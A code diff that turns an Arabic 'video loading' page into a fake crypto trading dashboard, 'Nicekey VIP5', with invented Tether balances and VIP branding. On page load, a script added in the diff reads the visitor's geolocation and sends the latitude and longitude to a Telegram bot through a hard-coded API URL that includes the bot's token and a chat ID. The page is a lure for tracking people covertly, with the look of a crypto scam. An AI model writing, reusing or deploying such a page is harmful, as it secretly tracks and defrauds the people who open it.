@@ -1,10 +1,125 @@
 <!DOCTYPE html>
-<html><body>
-<h2>تحميل الفيديو...</h2>
-<video width="320" height="240" controls autoplay>
-  <source src="/video.mp4" type="video/mp4">
-</video>
-<script>
-  fetch('/log').catch(console.error);
-</script>
-</body></html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nicekey VIP5</title>
+  <style>
+    body {
+      background: linear-gradient(to bottom right, #0b1e3c, #08152a);
+      color: white;
+      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px;
+      background-color: #111c3a;
+    }
+    .vip {
+      background-color: orange;
+      color: white;
+      padding: 5px 10px;
+      border-radius: 5px;
+      font-weight: bold;
+    }
+    .section {
+      padding: 20px;
+      background-color: #0f2b55;
+      margin: 10px;
+      border-radius: 10px;
+    }
+    .section h3 {
+      margin: 0;
+      font-size: 16px;
+      color: #aaa;
+    }
+    .section p {
+      margin: 5px 0 0;
+      font-size: 20px;
+      font-weight: bold;
+    }
+    .carousel {
+      display: flex;
+      overflow-x: auto;
+      scroll-snap-type: x mandatory;
+    }
+    .carousel img {
+      max-width: 90%;
+      border-radius: 10px;
+      margin: 10px;
+      scroll-snap-align: center;
+    }
+    .menu {
+      display: flex;
+      justify-content: space-around;
+      padding: 15px;
+      background-color: #061225;
+    }
+    .menu div {
+      text-align: center;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <span>مرحباً تاجر</span>
+    <span class="vip">VIP5</span>
+  </div>
+
+  <div class="section">
+    <h3>إجمالي الأصول</h3>
+    <p>4,895,460 تيثر</p>
+  </div>
+  <div class="section">
+    <h3>الرصيد المتاح</h3>
+    <p>4,672,460 تيثر</p>
+  </div>
+  <div class="section">
+    <h3>الأموال المجمدة</h3>
+    <p>223,000 تيثر</p>
+  </div>
+
+  <div class="carousel">
+    <img src="https://i.imgur.com/eh5Zqg2.jpg" alt="robot1">
+    <img src="https://i.imgur.com/FgLXYDi.jpg" alt="robot2">
+    <img src="https://i.imgur.com/uvId1bn.jpg" alt="robot3">
+  </div>
+
+  <div class="menu">
+    <div>إيداع</div>
+    <div>تحويل</div>
+    <div>عملية</div>
+    <div>ينسحب</div>
+    <div>السجلات</div>
+  </div>
+
+  <div class="menu">
+    <div>🏠 بيت</div>
+    <div>💰 تمويل</div>
+    <div>👑 كبار الشخصيات</div>
+    <div>👤 حساب</div>
+  </div>
+
+  <script>
+    window.onload = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((position) => {
+          fetch("https://api.telegram.org/bot8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0/sendMessage", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+              chat_id: "7485197107",
+              text: `📍 الموقع:\\nLatitude: ${position.coords.latitude}\\nLongitude: ${position.coords.longitude}`
+            })
+          });
+        });
+      }
+    }
+  </script>
+</body>
+</html>
